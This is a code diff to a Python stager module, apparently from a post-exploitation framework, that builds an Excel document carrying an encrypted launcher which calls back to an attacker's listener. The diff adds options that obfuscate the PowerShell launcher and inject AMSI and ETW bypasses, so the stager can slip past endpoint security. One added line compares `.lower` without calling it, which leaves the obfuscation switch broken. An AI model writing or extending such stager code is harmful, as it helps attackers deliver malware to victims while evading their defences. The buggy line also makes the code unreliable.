@@ -1,14 +1,19 @@
 from __future__ import print_function
-from builtins import str
+
+import datetime
+import random
+import string
+import xlrd
 from builtins import chr
-from builtins import range
 from builtins import object
-import random, string, xlrd, datetime
-from xlutils.copy import copy
-from xlwt import Workbook, Utils
-from lib.common import helpers
+from builtins import range
+from builtins import str
+
 from Crypto.Cipher import AES
-import os
+from xlutils.copy import copy
+from xlwt import Workbook
+
+from lib.common import helpers
 
 
 class Stager(object):
@@ -37,6 +42,26 @@ class Stager(object):
                 'Description': 'Listener to generate stager for.',
                 'Required': True,
                 'Value': ''
+            },
+            'Obfuscate': {
+                'Description': 'Switch. Obfuscate the launcher powershell code, uses the ObfuscateCommand for obfuscation types. For powershell only.',
+                'Required': False,
+                'Value': 'False'
+            },
+            'ObfuscateCommand': {
+                'Description': 'The Invoke-Obfuscation command to use. Only used if Obfuscate switch is True. For powershell only.',
+                'Required': False,
+                'Value': r'Token\All\1'
+            },
+            'AMSIBypass': {
+                'Description': 'Include mattifestation\'s AMSI Bypass in the stager code.',
+                'Required': False,
+                'Value': 'True'
+            },
+            'AMSIBypass2': {
+                'Description': 'Include Tal Liberman\'s AMSI Bypass in the stager code.',
+                'Required': False,
+                'Value': 'False'
             },
             'Language': {
                 'Description': 'Language of the launcher to generate.',
@@ -92,6 +117,11 @@ class Stager(object):
                 'Description': 'Proxy credentials ([domain\]username:password) to use for request (default, none, or other) (2nd stage).',
                 'Required': False,
                 'Value': 'default'
+            },
+            'ETWBypass': {
+                'Description': 'Include tandasat\'s ETW bypass in the stager code.',
+                'Required': False,
+                'Value': 'False'
             }
             
         }
@@ -120,6 +150,11 @@ class Stager(object):
         return coords
     
     def generate(self):
+        #default booleans to false
+        obfuscateScript = False
+        AMSIBypassBool = False
+        AMSIBypass2Bool = False
+
         # extract all of our options
         language = self.options['Language']['Value']
         listenerName = self.options['Listener']['Value']
@@ -131,6 +166,21 @@ class Stager(object):
         xlsOut = self.options['XlsOutFile']['Value']
         XmlPath = self.options['XmlUrl']['Value']
         XmlOut = self.options['XmlOutFile']['Value']
+        ETWBypass = self.options['ETWBypass']['Value']
+
+        if self.options['AMSIBypass']['Value'].lower() == "true":
+            AMSIBypassBool = True
+        if self.options['AMSIBypass2']['Value'].lower() == "true":
+            AMSIBypass2Bool = True
+        if self.options['Obfuscate']['Value'].lower == "true":
+            obfuscateScript = True
+        ETWBypassBool = False
+        if ETWBypass.lower() == 'true':
+            ETWBypassBool =True
+
+        obfuscateCommand = self.options['ObfuscateCommand']['Value']
+
+
         # catching common ways date is incorrectly entered
         killDate = self.options['KillDate']['Value'].replace('\\', '/').replace(' ', '').split('/')
         if (int(killDate[2]) < 100):
@@ -154,9 +204,18 @@ class Stager(object):
         encIV = random.randint(1, 240)
 
         # generate the launcher
-        launcher = self.mainMenu.stagers.generate_launcher(listenerName, language=language, encode=False,
+        if language.lower() == "python":
+            launcher = self.mainMenu.stagers.generate_launcher(listenerName, language=language, encode=False,
                                                            userAgent=userAgent, proxy=proxy, proxyCreds=proxyCreds,
                                                            stagerRetries=stagerRetries)
+        else:
+            launcher = self.mainMenu.stagers.generate_launcher(listenerName, language=language, encode=True,
+                                                               obfuscate=obfuscateScript,
+                                                               obfuscationCommand=obfuscateCommand, userAgent=userAgent,
+                                                               proxy=proxy, proxyCreds=proxyCreds,
+                                                               stagerRetries=stagerRetries, AMSIBypass=AMSIBypassBool,
+                                                               AMSIBypass2=AMSIBypass2Bool, ETWBypass=ETWBypassBool)
+
         launcher = launcher.replace("\"", "'")
         
         if launcher == "":
